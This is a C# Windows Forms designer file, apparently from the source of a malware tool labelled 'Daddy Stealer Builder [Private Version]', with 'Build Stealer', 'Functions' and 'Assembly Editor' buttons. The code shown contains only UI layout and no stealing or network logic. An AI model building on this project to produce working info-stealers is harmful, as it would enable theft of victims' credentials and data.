namespace DaddyRecoveryBuilder
{
    partial class DaddyFrm
    {
        /// <summary>
        /// Обязательная переменная конструктора.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Освободить все используемые ресурсы.
        /// </summary>
        /// <param name="disposing">истинно, если управляемый ресурс должен быть удален; иначе ложно.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Код, автоматически созданный конструктором форм Windows

        /// <summary>
        /// Требуемый метод для поддержки конструктора — не изменяйте 
        /// содержимое этого метода с помощью редактора кода.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(DaddyFrm));
            this.UPanel = new System.Windows.Forms.Panel();
            this.LogoText = new System.Windows.Forms.Label();
            this.ExClose = new System.Windows.Forms.Button();
            this.MainFrm = new System.Windows.Forms.Panel();
            this.ShowAssembly = new DaddyRecoveryBuilder.Design.NewButton();
            this.ShowFunctions = new DaddyRecoveryBuilder.Design.NewButton();
            this.ShowBuild = new DaddyRecoveryBuilder.Design.NewButton();
            this.UPanel.SuspendLayout();
            this.SuspendLayout();
            // 
            // UPanel
            // 
            this.UPanel.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(120)))), ((int)(((byte)(5)))), ((int)(((byte)(179)))));
            this.UPanel.Controls.Add(this.LogoText);
            this.UPanel.Controls.Add(this.ExClose);
            this.UPanel.Dock = System.Windows.Forms.DockStyle.Top;
            this.UPanel.Location = new System.Drawing.Point(0, 0);
            this.UPanel.Name = "UPanel";
            this.UPanel.Size = new System.Drawing.Size(745, 33);
            this.UPanel.TabIndex = 0;
            // 
            // LogoText
            // 
            this.LogoText.AutoSize = true;
            this.LogoText.Font = new System.Drawing.Font("Microsoft JhengHei", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.LogoText.ForeColor = System.Drawing.SystemColors.ControlLightLight;
            this.LogoText.Location = new System.Drawing.Point(270, 9);
            this.LogoText.Name = "LogoText";
            this.LogoText.Size = new System.Drawing.Size(208, 15);
            this.LogoText.TabIndex = 1;
            this.LogoText.Text = "Daddy Stealer Builder [Private Version]";
            // 
            // ExClose
            // 
            this.ExClose.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
            this.ExClose.FlatAppearance.BorderSize = 0;
            this.ExClose.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.ExClose.Location = new System.Drawing.Point(714, 0);
            this.ExClose.Name = "ExClose";
            this.ExClose.Size = new System.Drawing.Size(32, 33);
            this.ExClose.TabIndex = 0;
            this.ExClose.TabStop = false;
            this.ExClose.Text = "X";
            this.ExClose.UseVisualStyleBackColor = true;
            this.ExClose.Click += new System.EventHandler(this.ExClose_Click);
            // 
            // MainFrm
            // 
            this.MainFrm.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.MainFrm.Location = new System.Drawing.Point(0, 84);
            this.MainFrm.Name = "MainFrm";
            this.MainFrm.Size = new System.Drawing.Size(745, 304);
            this.MainFrm.TabIndex = 8;
            // 
            // ShowAssembly
            // 
            this.ShowAssembly.BackColor = System.Drawing.Color.Transparent;
            this.ShowAssembly.BGColor = "120; 5; 179";
            this.ShowAssembly.FontColor = "#ffffff";
            this.ShowAssembly.Location = new System.Drawing.Point(4, 45);
            this.ShowAssembly.Name = "ShowAssembly";
            this.ShowAssembly.Size = new System.Drawing.Size(143, 27);
            this.ShowAssembly.TabIndex = 9;
            this.ShowAssembly.TabStop = false;
            this.ShowAssembly.Text = "Assembly Editor";
            this.ShowAssembly.Click += new System.EventHandler(this.ShowAssembly_Click);
            // 
            // ShowFunctions
            // 
            this.ShowFunctions.BackColor = System.Drawing.Color.Transparent;
            this.ShowFunctions.BGColor = "120; 5; 179";
            this.ShowFunctions.FontColor = "#ffffff";
            this.ShowFunctions.Location = new System.Drawing.Point(153, 45);
            this.ShowFunctions.Name = "ShowFunctions";
            this.ShowFunctions.Size = new System.Drawing.Size(143, 27);
            this.ShowFunctions.TabIndex = 10;
            this.ShowFunctions.TabStop = false;
            this.ShowFunctions.Text = "Functions";
            this.ShowFunctions.Click += new System.EventHandler(this.ShowFunctions_Click);
            // 
            // ShowBuild
            // 
            this.ShowBuild.BackColor = System.Drawing.Color.Transparent;
            this.ShowBuild.BGColor = "120; 5; 179";
            this.ShowBuild.FontColor = "#ffffff";
            this.ShowBuild.Location = new System.Drawing.Point(302, 45);
            this.ShowBuild.Name = "ShowBuild";
            this.ShowBuild.Size = new System.Drawing.Size(143, 27);
            this.ShowBuild.TabIndex = 11;
            this.ShowBuild.TabStop = false;
            this.ShowBuild.Text = "Build Stealer";
            this.ShowBuild.Click += new System.EventHandler(this.ShowBuild_Click);
            // 
            // DaddyFrm
            // 
            this.AllowDrop = true;
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(24)))), ((int)(((byte)(24)))), ((int)(((byte)(27)))));
            this.ClientSize = new System.Drawing.Size(745, 388);
            this.Controls.Add(this.ShowBuild);
            this.Controls.Add(this.ShowFunctions);
            this.Controls.Add(this.ShowAssembly);
            this.Controls.Add(this.MainFrm);
            this.Controls.Add(this.UPanel);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MaximizeBox = false;
            this.Name = "DaddyFrm";
            this.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Daddy Recovery Builder";
            this.TopMost = true;
            this.Load += new System.EventHandler(this.DaddyFrm_Load);
            this.UPanel.ResumeLayout(false);
            this.UPanel.PerformLayout();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Panel UPanel;
        private System.Windows.Forms.Panel MainFrm;
        private System.Windows.Forms.Button ExClose;
        private Design.NewButton ShowAssembly;
        private Design.NewButton ShowFunctions;
        private Design.NewButton ShowBuild;
        private System.Windows.Forms.Label LogoText;
    }
}

